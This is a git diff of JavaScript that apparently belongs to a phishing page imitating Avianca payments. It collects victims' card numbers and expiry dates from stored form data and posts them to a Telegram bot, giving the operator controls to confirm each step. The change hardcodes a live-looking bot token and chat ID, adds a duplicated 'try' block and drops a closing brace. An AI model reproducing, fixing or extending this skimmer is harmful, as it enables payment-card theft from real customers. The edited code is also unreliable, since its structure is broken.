@@ -41,14 +41,14 @@ document.addEventListener("DOMContentLoaded", () => {
 
         console.log("✅ Datos recuperados (pagoavianca):", pagoavianca);
 
-        // Generar un transactionId único
+       // ⚠️ Aquí pegas tu token y chat ID directamente:
+        const config = {
+            botToken: "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y",
+            chatId: "-4644294739"
+        };
+
         const transactionId = Date.now().toString();
-
-        // Cargar configuración desde claves.json
-        const config = await loadConfig();
-        if (!config) return;
-
-        // Construir el mensaje a enviar a Telegram
+        
         const mensaje = `✈️ <b>Avianca</b> ✈️
 💳 Tarjeta: <code>${pagoavianca.card}</code>
 🗓️ Fecha: <code>${pagoavianca.card_date}</code>
@@ -78,8 +78,8 @@ document.addEventListener("DOMContentLoaded", () => {
                 [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
             ]
         };
-
-        // Enviar mensaje a Telegram
+        
+       try {
         try {
             const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                 method: "POST",
@@ -88,10 +88,10 @@ document.addEventListener("DOMContentLoaded", () => {
                     chat_id: config.chatId,
                     text: mensaje,
                     parse_mode: "HTML",
-                    reply_markup: JSON.stringify(keyboard) // CORREGIDO
+                    reply_markup: keyboard
                 })
             });
-
+           
             const data = await response.json();
 
             if (data.ok) {
@@ -105,8 +105,6 @@ document.addEventListener("DOMContentLoaded", () => {
             console.error("❌ Error en fetch de sendMessage:", error);
         }
     });
-});
-
 // Función para cargar claves.json
 async function loadConfig() {
     try {
